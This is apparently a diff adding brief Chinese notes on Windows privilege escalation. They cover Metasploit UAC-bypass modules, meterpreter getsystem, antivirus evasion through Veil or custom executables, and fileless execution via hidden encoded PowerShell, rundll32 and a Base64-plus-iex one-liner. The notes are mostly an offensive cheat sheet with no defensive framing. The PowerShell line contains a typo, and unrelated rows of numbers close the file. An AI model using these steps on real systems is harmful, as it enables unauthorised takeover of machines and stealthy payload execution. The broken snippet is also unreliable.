@@ -1,0 +1,32 @@
+windows提权
+UAC用户账户控制，想办法绕过
+msf
+标准---管理员
+exploit/windows/local/ask    //RunAs攻击
+通过使用EXE::Custom创建，或是利用veil框架加密免杀
+
+当前用户在管理员组---特权---系统级别
+exploit/windows/local/bypassuac
+meterpreter>getsystem
+本地利用模块：(劫持当前用户注册表，并自定义命令)
+exploit/windows/local/bypassuac_fodhelper
+
+
+无文件技术
+Hidden -nop -noni -enc <payload>
+rundll32 powershdll.dll,main
+[System.Text.Encoding]::Default.GetString([System.Convent]::FromBase64String("BASE64")) iex
+
+
+1    2    3      4     5     6
+10 19 109 199 1099 1999
+8   17 107 197 1097 1997
+
+
+
+
+
+
+
+
+
